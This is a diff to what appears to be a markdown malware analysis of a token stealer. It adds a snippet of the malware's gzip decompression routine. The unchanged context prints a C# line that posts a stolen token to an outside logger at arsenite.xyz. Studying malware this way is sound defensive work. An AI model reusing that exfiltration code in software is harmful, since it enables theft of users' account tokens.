@@ -20,6 +20,20 @@
 HttpResponseMessage result = TokenDiscovery._httpClient.PostAsync("https://arsenite.xyz/logger/" + Config.Id + "/report", new StringContent("{\"token\":\"" + token + "\"}", Encoding.UTF8, "application/json")).Result;
 ```
 
+##### gzip 
+
+```
+private static byte[] GZip(byte[] compressed)
+		{
+			MemoryStream stream = new MemoryStream(compressed);
+			GZipStream gzipStream = new GZipStream(stream, CompressionMode.Decompress);
+			MemoryStream memoryStream = new MemoryStream();
+			gzipStream.CopyTo(memoryStream);
+			gzipStream.Close();
+			return memoryStream.ToArray();
+		}
+```
+
 # directory tree
 
 ```
